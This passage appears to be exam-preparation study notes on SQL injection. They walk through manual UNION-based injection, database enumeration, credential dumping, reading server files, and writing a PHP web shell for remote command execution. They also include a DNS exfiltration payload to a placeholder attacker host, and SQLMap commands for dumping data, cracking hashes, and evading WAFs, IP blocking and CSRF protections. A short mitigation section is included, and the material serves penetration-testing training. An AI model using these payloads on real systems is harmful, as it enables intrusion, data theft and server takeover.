SELECT city FROM ports UNION SELECT * FROM ships;
-- ERROR: The used SELECT statements have a different number of columns

Handling Uneven Column Counts

If you can only SELECT one column but the original query has 4 columns, pad with junk:

SELECT username FROM passwords UNION SELECT 1, 2, 3, 4-- -
-- username goes in column 1; columns 2,3,4 are filled with numbers
  • Use NULL for maximum compatibility (NULL fits any data type)
  • Using numbers (1,2,3,4) is helpful to identify which column appears where in the output

Union Injection

Step 1 — Confirm the Injection Point

Inject a single quote to trigger an error:

'

If you see a SQL error → the search parameter is injectable.

Step 2 — Detect Number of Columns

Method A — ORDER BY (recommended: works until error)

Increment the column number until you get an error:

' ORDER BY 1-- -    ← works (table has at least 1 column)
' ORDER BY 2-- -    ← works
' ORDER BY 3-- -    ← works
' ORDER BY 4-- -    ← works
' ORDER BY 5-- -    ← ERROR: "Unknown column '5' in order clause"

→ Table has 4 columns.

Method B — UNION SELECT (works until success)

Start with a guess and increase:

cn' UNION SELECT 1,2,3-- -      ← ERROR: different number of columns
cn' UNION SELECT 1,2,3,4-- -    ← SUCCESS: see numbers 2,3,4 in output

→ Table has 4 columns.

Why: You need to know the column count to craft a valid UNION payload. The UNION must select the same number of columns as the original query.

Step 3 — Find Which Columns Are Displayed

The web application may not display all columns. From the UNION test above:

Result shows: 2 | 3 | 4   (column 1 is not displayed — probably the ID)

→ You can place your injection in columns 2, 3, or 4.

Verify with a real query:

cn' UNION SELECT 1,@@version,3,4-- -

→ If the DB version appears in the output where 2 was → column 2 is injectable and visible.

➜ Next step Now that you know which columns are visible, use them to extract real data.

MySQL Fingerprinting

Before enumerating, confirm you're dealing with MySQL (different DBMS = different syntax):

Payload Use Case MySQL Expected Output
SELECT @@version Full query output visible MySQL/MariaDB version string
SELECT POW(1,1) Only numeric output 1
SELECT SLEEP(5) Blind (no output) 5-second page delay

UNION payload:

cn' UNION SELECT 1,@@version,3,4-- -

If you see something like 10.3.22-MariaDB-1ubuntu1 → confirmed MySQL/MariaDB.

  • Apache/Nginx web server → likely MySQL
  • IIS web server → likely MSSQL

Database Enumeration

Once you know the column count and which are visible, use INFORMATION_SCHEMA to map the entire database structure.

What is INFORMATION_SCHEMA?

INFORMATION_SCHEMA is a built-in metadata database present in every MySQL instance. It contains information about all other databases, tables, and columns on the server.

You can't call its tables directly with a simple table name — you must reference it with the dot notation: INFORMATION_SCHEMA.SCHEMATA

List All Databases — SCHEMATA

-- Direct MySQL command:
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

-- Via UNION injection:
cn' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
🔍 What you're looking for Non-default databases (ignore information_schema, mysql, performance_schema, sys).

Example output: ilfreight, dev → these are interesting targets.

Find the Current Database

-- Via UNION injection:
cn' UNION SELECT 1,database(),2,3-- -

Why: Tells you which database the web app is currently using. Other databases found in SCHEMATA (like dev) may contain more sensitive data.

List Tables in a Database — TABLES

cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES 
WHERE table_schema='dev'-- -
  • TABLE_NAME → name of each table
  • TABLE_SCHEMA → which database it belongs to
  • WHERE table_schema='dev' → filter to only show the dev database (without this, you'd get ALL tables from ALL databases)
🔍 What you're looking for Tables with interesting names — credentials, users, passwords, flags, admin, etc.

Example output: credentials, framework, pages, posts in the dev database.

List Columns in a Table — COLUMNS

cn' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS 
WHERE table_name='credentials'-- -
  • COLUMN_NAME → column names in the target table
  • WHERE table_name='credentials' → filter to the specific table
🔍 What you're looking for Column names like username, password, email, api_key, flag, etc.

Example output: username, password in the credentials table of the dev database.

Dump the Data

cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -
  • dev.credentials → dot notation to reference a table in a different database (you're currently in ilfreight, but the data is in dev)
  • Place username and password in the visible columns (2 and 3)

Example output:

admin      | 5f4dcc3b5aa765d61d8327deb882cf99
dev_admin  | 47e761039fd8ba3705d38142eaffbdd5
api_key    | MzkyMDM3ZGJiYTUxZjY5Mjc3NmQ2Y2VmYjZkZDU0NmQlC0K

These look like MD5 hashes. Crack them with hashcat or john, or use crackstation.net.

Reading Files via SQLi

Beyond data extraction, SQLi can be used to read files from the server's filesystem.

Step 1 — Determine Your DB User

-- Option A:
cn' UNION SELECT 1, user(), 3, 4-- -

-- Option B:
cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- -

Why: File read/write requires the FILE privilege. DBA users (like root) are more likely to have it.

Example output: root@localhost → very promising, likely DBA.

Step 2 — Check for Super Admin Privileges

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
  • super_priv column contains Y (yes) or N (no)
  • WHERE user="root" → filter to your specific user

Output: Y → superuser confirmed.

Step 3 — Check ALL Privileges

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges 
WHERE grantee="'root'@'localhost'"-- -

Why: Lists every specific privilege granted. You're specifically looking for FILE in the privilege_type column.

Example output includes: SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, FILE ← this is what enables file read/write.

Step 4 — Check secure_file_priv

secure_file_priv controls where MySQL is allowed to read/write files:
- Empty → can access the entire filesystem
- Path → restricted to that directory only
- NULL → cannot read/write files at all

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM 
information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
Value Meaning
(empty) Full filesystem access — exploitation possible
/var/lib/mysql-files Default MySQL — restricted, harder to exploit
NULL File read/write disabled

MariaDB defaults to empty (full access). MySQL defaults to /var/lib/mysql-files.

Step 5 — Read a File with LOAD_FILE()

LOAD_FILE() is a MySQL/MariaDB function that reads a file and returns its contents as a string.

-- Direct MySQL:
SELECT LOAD_FILE('/etc/passwd');

-- Via UNION injection:
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

Requires: FILE privilege AND the OS user running MySQL must have read permission on the file.

What to read:
- /etc/passwd → OS users, confirms file read works
- /etc/shadow → password hashes (usually not readable unless MySQL runs as root)
- /var/www/html/index.php → web app source code
- /var/www/html/config.php → DB credentials, API keys
- /etc/apache2/apache2.conf → Apache config (find webroot)
- /etc/nginx/nginx.conf → Nginx config

Read the current page's source code:

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

The result renders as HTML in the browser. Use Ctrl+U to view raw page source and read the PHP code.

What to do with source code: Look for database connection credentials, other SQL queries, file paths, API keys, hardcoded secrets, and additional vulnerabilities.

Writing Files via SQLi

If secure_file_priv is empty and you have FILE privilege and write access to the target directory → you can write files to the server.

Prerequisites for Writing Files

  1. User has FILE privilege ✅ (verified above)
  2. secure_file_priv is empty ✅ (verified above)
  3. Write access to target directory ✅ (test with a proof file)

SELECT INTO OUTFILE — Writing Files

-- Write table data to a file:
SELECT * FROM users INTO OUTFILE '/tmp/credentials';

-- Write an arbitrary string to a file:
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

Via UNION injection — test write access:

cn' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -

Then browse to http://TARGET/proof.txt — if you see the content, write access confirmed.

Note: You'll also see 1, 3, 4 (the junk numbers) in the file. To write clean files, use "" instead of numbers.

Writing a Web Shell

A web shell is a script on the server that executes commands you send via HTTP.

PHP web shell payload:

<?php system($_REQUEST[0]); ?>
  • system() → executes OS commands
  • $_REQUEST[0] → takes the command from the URL parameter ?0=COMMAND

Write it via UNION injection:

cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -

Using "" instead of numbers keeps the file clean.

Finding the webroot:
- Apache: /var/www/html/ (config at /etc/apache2/apache2.conf)
- Nginx: /usr/share/nginx/html/ or /var/www/html/ (config at /etc/nginx/nginx.conf)
- IIS: C:\inetpub\wwwroot\ (config at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config)
- Or use fuzzing wordlists for Linux / Windows to guess the path.

Execute commands via the web shell:

http://TARGET/shell.php?0=id
http://TARGET/shell.php?0=whoami
http://TARGET/shell.php?0=cat+/etc/passwd
http://TARGET/shell.php?0=ls+-la+/var/www/html/

Expected output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

→ You have Remote Code Execution (RCE) as www-data.

Advanced tip: Use FROM_BASE64("base64_data") to write binary files or complex scripts without encoding issues.

Mitigating SQL Injection

1. Input Sanitization

Vulnerable code (PHP):

$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM logins WHERE username='" . $username . "' AND password = '" . $password . "'";

Fixed with mysqli_real_escape_string():

$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);
$query = "SELECT * FROM logins WHERE username='" . $username . "' AND password = '" . $password . "'";
  • Escapes special characters like ' and " → they lose their SQL meaning
  • PostgreSQL equivalent: pg_escape_string()

Result: admin' or '1'='1 becomes admin\' or \'1\'=\'1 → treated as literal string, not SQL.

2. Input Validation

Validate that input matches expected format before it reaches the query.

Vulnerable code:

$q = "SELECT * FROM ports WHERE port_code LIKE '%" . $_GET["port_code"] . "%'";

Fixed with regex validation:

$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];
if (!preg_match($pattern, $code)) {
    die("Invalid input! Please try again.");
}
$q = "SELECT * FROM ports WHERE port_code LIKE '%" . $code . "%'";
  • [A-Za-z\s]+ → only allows letters and spaces
  • Any other character (like ', -, 1) → rejected immediately

3. Parameterized Queries (Prepared Statements) ← BEST PRACTICE

$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM logins WHERE username=? AND password = ?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
  • ? placeholders are filled after the query structure is fixed
  • The driver handles escaping automatically
  • Even if user inputs ' OR '1'='1, it's treated as a literal string — not SQL
  • This is the most reliable protection against SQLi

4. Least-Privilege User

Never run web applications as root or DBA. Create a restricted DB user:

-- Create a new user:
CREATE USER 'reader'@'localhost';

-- Grant only what's needed (SELECT on one table):
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';

Verify it works:

mysql -u reader -p
USE ilfreight;
SELECT * FROM ilfreight.credentials;  -- ERROR: access denied ✅

→ Even if SQLi is exploited, the attacker cannot access other tables or databases, and cannot read/write files.

5. Web Application Firewall (WAF)

WAFs detect and block malicious HTTP requests based on patterns.

  • Open-source: ModSecurity
  • Commercial: Cloudflare, Imperva, AWS WAF

WAFs block requests containing patterns like INFORMATION_SCHEMA, UNION SELECT, LOAD_FILE, etc.

Limitation: WAFs can be bypassed with encoding, case variation, and comment insertion. They're a layer of defense, not a complete solution.

Full Cheat Sheet Reference

MySQL CLI Commands

Command Description

SHOW DATABASES; List all databases

CREATE TABLE logins (id INT, ...) Create a new table
SHOW TABLES; List tables in current database
DESCRIBE logins; Show table structure and column types

INSERT INTO table(col2) VALUES (v2) Insert into specific columns
UPDATE table SET col1=val WHERE cond Update rows matching condition

ALTER TABLE logins RENAME COLUMN old TO new Rename a column

SELECT * FROM logins ORDER BY col DESC Sort descending
SELECT * FROM logins LIMIT 2 Return first 2 rows
SELECT * FROM logins LIMIT 1, 2 Skip 1, return 2 rows

MySQL Operator Precedence (High → Low)

  1. /, *, %
  2. +, -
  3. =, >, <, <=, >=, !=, LIKE
  4. ! (NOT)
  5. && (AND)
  6. \|\| (OR)

Auth Bypass

Payload Use Case

More payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

Payload Purpose

Payload Purpose

Privileges

Payload Purpose

  • Always test with a single quote ' first — if you get a SQL error, the field is injectable
  • Use ORDER BY to count columns — safer and cleaner than UNION testing
  • Numbers as junk data — 1,2,3,4 in UNION makes it easy to see which columns are displayed
  • INFORMATION_SCHEMA is your map — SCHEMATA → TABLES → COLUMNS → then target data
  • Dot notation for cross-DB queries — dev.credentials when you're in a different database
  • Check secure_file_priv before attempting file ops — empty = you can proceed
  • Web shell = RCE — if you can write to webroot and it's a PHP app, you win
  • Comment syntax matters — -- - (with trailing space/dash) is most reliable in MySQL
  • Parenthesis mismatch — if '-- - fails, try ')-- - to close an open paren
  • URL-encode payloads in GET params — ' = %27, # = %23, space = + or %20

Notes created for HTB CPTS exam preparation — SQL Injection Fundamentals module

Web Applications/Module 18

SQLMap Essentials

🧰 What is SQLMap?

SQLMap is a free, open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL Injection (SQLi) flaws. It has been continuously developed since 2006 and is still actively maintained.

What it does:
- Detects injectable parameters automatically
- Fingerprints the backend database (DBMS)
- Enumerates databases, tables, columns, and data
- Cracks password hashes
- Can read/write files on the server
- Can spawn an OS shell if privileges allow

Why use it over manual testing?
SQLi detection requires sending many permutations of payloads and comparing responses — a tedious manual task. SQLMap automates all of this with intelligent heuristics and a massive payload library.

⚙️ Installation

Pre-installed (Pwnbox / Kali / Parrot)

SQLMap comes pre-installed on most security-focused Linux distros. Just run:

sqlmap

Install via apt (Debian/Ubuntu)

sudo apt install sqlmap

Manual Installation from GitHub

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

--depth 1 clones only the latest commit, saving bandwidth.

Then run with:

python sqlmap.py

🗃️ Supported Databases

SQLMap has the largest DBMS support of any SQL exploitation tool. It fully supports:
MySQL Oracle PostgreSQL Microsoft SQL Server
SQLite IBM DB2 Microsoft Access Firebird
Sybase SAP MaxDB Informix MariaDB
HSQLDB CockroachDB TiDB MemSQL
H2 MonetDB Apache Derby Amazon Redshift
Vertica Mckoi Presto Altibase
MimerSQL CrateDB Greenplum Drizzle
Apache Ignite Cubrid InterSystems Cache IRIS
eXtremeDB FrontBase

The SQLMap team periodically adds support for new DBMSes.

💉 SQL Injection Types Supported

SQLMap is the only pentesting tool that can properly detect and exploit all known SQLi types. View them with:

sqlmap -hh
# Look for the --technique section

The technique flag BEUSTQ maps to:

Letter Type Description
B Boolean-based Blind Differentiates TRUE/FALSE responses by comparing server output. Most common type. Retrieves ~1 byte per request.
E Error-based Triggers DBMS errors that contain query results. Fast — retrieves ~200 bytes per request.
U UNION query-based Extends the original query with UNION to pull extra data. Fastest type — can dump entire tables in one request.
S Stacked queries "Piggybacks" additional SQL statements (INSERT, UPDATE, DELETE). Requires platform support (MSSQL, PostgreSQL).
T Time-based Blind Uses response delay (e.g., SLEEP) as TRUE/FALSE signal. Slowest but works when other types don't.
Q Inline queries Embeds a subquery within the original query. Uncommon — requires specific app structure.

Example Payloads by Type

Boolean-based blind:

AND 1=1          -- TRUE: response looks normal
AND 1=2          -- FALSE: response differs

You look for: a difference in the response content, size, or HTTP code.

Error-based:

AND GTID_SUBSET(@@version,0)

You look for: DBMS error messages containing version info or query results.

UNION query-based:

UNION ALL SELECT 1,@@version,3

You look for: the injected data appearing in the normal page response.

Stacked queries:

; DROP TABLE users

Used when: you need to run non-SELECT statements (INSERT/UPDATE/DELETE).

Time-based blind:

AND 1=IF(2>1,SLEEP(5),0)

You look for: a ~5 second delay in the response (TRUE) vs instant response (FALSE).

Out-of-band (DNS exfiltration):

LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

Used when: all other types are too slow or unsupported. Requires control of a DNS server. Data leaks via DNS queries to your domain.

Inline query:

SELECT (SELECT @@version)

🆘 Getting Help

Basic help menu

sqlmap -h

Why: Shows the most common options. Start here when learning or looking for a specific flag.

Advanced help menu

sqlmap -hh

Why: Shows ALL options including advanced tuning, tampering, enumeration, etc. Use this when you need something specific that -h doesn't show.

🚀 Basic Scenario — First Run

The Vulnerable Code (What You're Attacking)

$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> " . mysqli_error($link) . "<br>\n");

The id GET parameter is directly concatenated into the SQL query — no sanitization. This is what SQLMap exploits.

Running SQLMap Against a GET Parameter

sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
Flag What it does Why you use it
-u Specifies the target URL Tells SQLMap where to send requests
--batch Auto-selects default answers to all prompts Runs non-interactively; good for automation

What happens next: SQLMap tests the id parameter with hundreds of payloads, detects the injection type, fingerprints the DBMS, and reports findings. Then you proceed to enumeration using the identified vulnerable parameter.

📊 Understanding SQLMap Output

These are the key log messages you'll see during a scan and what they mean:

Message What it means What to do
target URL content is stable Responses are consistent — good baseline for comparison Nothing, continue
GET parameter 'id' appears to be dynamic The parameter affects the response — likely linked to a DB Good sign, continue
heuristic test shows 'id' might be injectable SQLMap sent a malformed value and got a DBMS error back Still needs confirmation
heuristic XSS test shows 'id' might be vulnerable to XSS Quick bonus check — not primary purpose Note for report
it looks like the back-end DBMS is 'MySQL' DBMS fingerprinted via error messages or behavior SQLMap will narrow payloads to MySQL-specific ones
reflective value(s) found and filtering out Your injected payload appears in the response (noise) SQLMap handles this automatically
'id' appears to be 'AND boolean-based blind' injectable Confirmed injection type — --string="luther" means a constant string in TRUE responses was found Proceed to enumeration
time-based comparison requires larger statistical model Building baseline for timing attacks Wait for it to complete
automatically extending ranges for UNION query injection Another injection type found, so SQLMap extends UNION checks Good — more vectors
ORDER BY technique appears to be usable SQLMap can use ORDER BY to quickly find the number of UNION columns Speeds up UNION detection
GET parameter 'id' is vulnerable Confirmed injectable Begin enumeration
sqlmap identified the following injection point(s) Final summary with type, title, and payload Use for reporting
fetched data logged to text files under ... Output saved locally Check ~/.sqlmap/output/<target>/ for all session data

🌐 Running SQLMap on HTTP Requests

Method 1 — GET Parameter (Most Common)

sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

Use when the injection point is in a URL parameter. SQLMap tests all detected parameters.

Method 2 — POST Data

sqlmap 'http://www.example.com/' --data 'uid=1&name=test'

Why: When the form submits via POST. SQLMap will test both uid and name parameters.
What next: If you already know which parameter is vulnerable, narrow it with -p uid.

Method 3 — Mark Injection Point with *

sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

Why: Use * to tell SQLMap exactly which parameter to test. Saves time when you already know the vulnerable field from manual testing.

Method 4 — From a Burp Request File

sqlmap -r req.txt

Why: When the request is complex (many headers, special cookies, encoded data). Capture the full HTTP request from Burp Suite → right-click → "Copy to file", then pass it to SQLMap.
Tip: Inside req.txt, you can mark the injection point with * (e.g., /?id=1*).

Example req.txt:

GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
DNT: 1

Method 5 — From a cURL Command

In Chrome/Firefox DevTools → Network tab → right-click a request → "Copy as cURL", then replace curl with sqlmap:

sqlmap 'http://www.example.com/?id=1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' \
  -H 'Accept: image/webp,*/*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  --compressed \
  -H 'Connection: keep-alive' \
  -H 'DNT: 1'

Why: Replicates your exact browser request — important for authenticated pages where session tokens/headers matter.

Method 6 — Specifying a Cookie

sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

or equivalently:

sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

Why: Required for testing pages that are only accessible when logged in. Without the session cookie, SQLMap would just get redirected to the login page.
What next: If the cookie parameter itself is injectable, mark it: --cookie="id=1*"

Method 7 — PUT Request

sqlmap -u www.target.com --data='id=1' --method PUT

Why: Some REST APIs use PUT/DELETE/PATCH instead of GET/POST. Use --method to force any HTTP verb.

Method 8 — JSON / XML POST Body

# Save your JSON request to req.txt, then:
sqlmap -r req.txt

SQLMap automatically detects and handles JSON/XML body formats when using -r. It will ask "JSON data found in HTTP body. Do you want to process it?" — answer Y.

🔧 Custom SQLMap Requests

Random User-Agent (Bypass Detection)

sqlmap -u "http://target.com/?id=1" --random-agent

Why: Some WAFs and IDS systems block the default SQLMap user-agent (sqlmap/1.4.x). This replaces it with a random real-browser value.

Mobile User-Agent

sqlmap -u "http://target.com/?id=1" --mobile

Why: Imitate a smartphone browser — useful if the mobile version of a site has different (weaker) protections.

Route Traffic Through a Proxy (Burp)

sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"

Why: Routes all SQLMap traffic through Burp Suite so you can inspect, replay, and modify requests manually. Essential for deep analysis.

Store All Traffic to a File

sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

Why: Saves every HTTP request and response to a file. Use it when something goes wrong — you can manually inspect what was sent and received.
What next: cat /tmp/traffic.txt to review all HTTP exchanges.

Increase Verbosity

sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch

Verbosity levels:

Level Shows
0 Errors only
1 Default — basic info messages
2 Debug messages
3 HTTP requests + payloads
4 HTTP responses
5 HTTP request/response full content
6 Everything — full HTTP traffic printed live

Why: Use -v 3 or higher when you want to see every payload being tested. Use -v 6 for deep debugging when SQLMap isn't detecting an injection you expect.

Parse and Display DBMS Errors

sqlmap -u "http://target.com/?id=1" --parse-errors

Why: If the server is returning DBMS error messages (e.g., MySQL syntax errors), this flag prints them clearly. Helps understand what went wrong with a payload.

⚡ Attack Tuning

Prefix and Suffix

sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

Why: Used when the vulnerable SQL context requires specific characters to "break out" of the existing query before injecting. For example, if the backend query is:
sql SELECT id FROM users WHERE id LIKE (('$input')) LIMIT 0,1
You need %')) to close the LIKE clause and parentheses before injecting, and -- - to comment out the rest.
When to use: When standard SQLMap payloads fail and you know the surrounding SQL context from error messages or source code review.

Level and Risk

sqlmap -u www.example.com/?id=1 -v 3 --level=5 --risk=3
Option Range Default Effect
--level 1–5 1 Increases number of boundary/prefix/suffix combinations tested. Higher = more HTTP requests, more coverage.
--risk 1–3 1 Increases payload aggressiveness. Risk 2 adds time-based tests; Risk 3 adds OR-based tests (can modify DB data).

Payload count:
- Default (--level=1 --risk=1): ~72 payloads per parameter
- Max (--level=5 --risk=3): ~7,865 payloads per parameter

Warning on --risk=3: OR-based payloads (e.g., OR 1=1) can modify or delete data in the database. Use with caution on production systems.

When to use higher levels: When default detection fails on a target you've confirmed is vulnerable through manual testing.

Advanced Response Comparison

By HTTP status code:

sqlmap -u "http://target.com/?id=1" --code=200

Why: When TRUE responses return HTTP 200 and FALSE responses return HTTP 500 (or vice versa). Tells SQLMap to treat a specific code as TRUE.

By page title:

sqlmap -u "http://target.com/?id=1" --titles

Why: When the <title> tag differs between TRUE and FALSE responses.

By specific string:

sqlmap -u "http://target.com/?id=1" --string="success"

Why: When a specific word appears only in TRUE responses. Fastest and most reliable detection method — no fuzzy comparison needed.

Text-only comparison:

sqlmap -u "http://target.com/?id=1" --text-only

Why: Strips all HTML tags and compares only visible text. Useful when pages have lots of dynamic JavaScript/CSS that changes between requests.

Limit technique:

sqlmap -u "http://target.com/?id=1" --technique=BEU

Why: Force SQLMap to only use specific injection types. Example: BEU = Boolean-blind + Error-based + UNION. Use when time-based payloads are causing timeouts or interfering with results.

UNION SQLi Tuning

# If you know the exact number of columns:
sqlmap -u "http://target.com/?id=1" --union-cols=17

# If NULL values don't work (some DBs require specific types):
sqlmap -u "http://target.com/?id=1" --union-char='a'

# For Oracle which requires FROM <table> in UNION:
sqlmap -u "http://target.com/?id=1" --union-from=users

Why: UNION injection requires knowing the exact number of columns in the original query. If SQLMap can't detect this automatically, provide it manually.

🔍 Database Enumeration

Basic Info — Banner, User, DB, DBA Check

sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
Flag What it retrieves Why you want it
--banner DBMS version string (e.g., MySQL 5.1.41) Tells you what version to research for vulnerabilities
--current-user The DB user running queries (e.g., root@%) Determines privilege level
--current-db The active database name (e.g., testdb) Starting point for table enumeration
--is-dba TRUE/FALSE — does current user have DBA rights If TRUE, you may be able to read/write files

What next: If --is-dba returns TRUE, proceed to OS exploitation. If FALSE, focus on data enumeration. Use --current-db output as the value for -D in subsequent commands.

List All Tables in a Database

sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

Why: After finding the database name, you need to know what tables exist to find interesting data.
What next: Look for tables named users, accounts, admin, credentials, passwords, etc.

Dump a Table

sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb

Why: Extract all rows from the target table.
What next: SQLMap saves output as CSV at ~/.sqlmap/output/<target>/dump/<db>/<table>.csv. If it detects password hashes, it will offer to crack them automatically.

Dump Specific Columns Only

sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

Why: Large tables with many columns can take a long time. If you only need usernames and passwords, specify just those columns.

Filter Rows by Condition

sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

Why: Narrow down results using SQL WHERE clauses. Useful when tables have thousands of rows and you're looking for specific entries.

Filter Rows by Row Number

sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

Why: Retrieve only rows 2 and 3 (by ordinal position). Useful for sampling large tables.

Dump All Tables in a Database

sqlmap -u "http://www.example.com/?id=1" --dump -D testdb

Why: Skip -T to dump all tables in the database at once.

Dump Everything from All Databases

sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs

Why: --dump-all dumps every database. --exclude-sysdbs skips system databases (information_schema, mysql, sys) which rarely contain useful pentest data.
Warning: This can be extremely slow and generate huge output files.

🔬 Advanced Database Enumeration

DB Schema — Full Table Structure

sqlmap -u "http://www.example.com/?id=1" --schema

Why: Retrieves the structure (columns + types) of ALL tables across all databases. Gives you a complete map of the database architecture without dumping the actual data.
What next: Use the schema to identify which tables have interesting columns (e.g., password, email, credit_card) before deciding what to dump.

Search for Tables by Name

sqlmap -u "http://www.example.com/?id=1" --search -T user

Why: When you don't know which database a table is in, use --search to find all tables whose name contains "user" (uses SQL LIKE operator). Searches across all databases.

Search for Columns by Name

sqlmap -u "http://www.example.com/?id=1" --search -C pass

Why: Find all columns containing "pass" across all databases and tables. Instantly reveals where passwords are stored without manually enumerating every table.

🔑 Password Enumeration and Cracking

Dump DB User Password Hashes

sqlmap -u "http://www.example.com/?id=1" --passwords --batch

Why: Targets system tables (e.g., mysql.user) that store the database users' own password hashes — separate from application user passwords.
What next: SQLMap will offer to run a dictionary attack on found hashes automatically.

How SQLMap Cracks Hashes

  • Runs in multi-process mode (uses all available CPU cores)
  • Supports 31 hash algorithm types (MD5, SHA1, bcrypt, MySQL hash, etc.)
  • Uses a built-in wordlist with 1.4 million entries (from public password leaks)
  • If a hash is not randomly generated, there's a good probability SQLMap will crack it

What next: Cracked passwords appear inline next to their hashes. Use them to:
1. Log into the application as that user
2. Try credential reuse on SSH, FTP, or other services
3. Escalate privileges within the DBMS

🛡️ Bypassing Web Application Protections

Anti-CSRF Token Bypass

sqlmap -u "http://www.example.com/" \
  --data="id=1&csrftoken=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" \
  --csrf-token="csrf-token"

Why: Many applications add CSRF tokens to forms — a unique value per page load that must be included in requests. SQLMap will automatically fetch a fresh page, extract the current token value, and update it before each request.
Auto-detection: If a parameter contains csrf, xsrf, or token in its name, SQLMap will ask if you want to auto-update it even without this flag.

Unique Value Bypass

sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5

Why: Some apps require a unique value per request (anti-bot measure). --randomize generates a new random value for the specified parameter in every request.

Calculated Parameter Bypass (Hash-based)

sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" \
  --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5

Why: Some apps require a hash of another parameter (e.g., h=MD5(id)). --eval runs Python code before each request to recalculate the dependent value.

IP Address Concealment

# Single proxy:
sqlmap -u "http://target.com/?id=1" --proxy="socks4://177.39.187.70:33283"

# Proxy list (rotates through on failure):
sqlmap -u "http://target.com/?id=1" --proxy-file=proxies.txt

# Route through Tor:
sqlmap -u "http://target.com/?id=1" --tor --check-tor

Why: If a WAF or IDS blacklists your IP after too many requests, rotate through proxies or use Tor.
Tor details: Requires Tor installed locally. SQLMap looks for SOCKS4 on port 9050/9150. --check-tor verifies Tor is working via https://check.torproject.org/ before proceeding.

WAF Detection

# SQLMap automatically tests for WAF on every run
# To skip WAF detection (less noise):
sqlmap -u "http://target.com/?id=1" --skip-waf

How it works: SQLMap sends a request with a malformed parameter (?pfov=...). A WAF will return a different response (e.g., HTTP 406) compared to normal. SQLMap uses the identYwaf library (signatures of 80+ WAFs) to identify the specific WAF.

User-Agent Blacklisting Bypass

sqlmap -u "http://target.com/?id=1" --random-agent

Why: Many WAFs block the default SQLMap user-agent string (sqlmap/1.4.x (http://sqlmap.org)). --random-agent picks a random real browser UA from a large pool.

Chunked Transfer Encoding

sqlmap -u "http://target.com/?id=1" --chunked

Why: Splits POST body into chunks, breaking up SQL keywords so they aren't recognized by signature-based WAFs (e.g., UNION might be split across chunks).

HTTP Parameter Pollution (HPP)

SQLMap uses HPP internally where payloads are split across multiple values of the same parameter:
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users
The target platform (e.g., ASP) concatenates them back. Bypasses WAFs that inspect individual parameter values.

Tamper Scripts

# List all available tamper scripts:
sqlmap --list-tampers

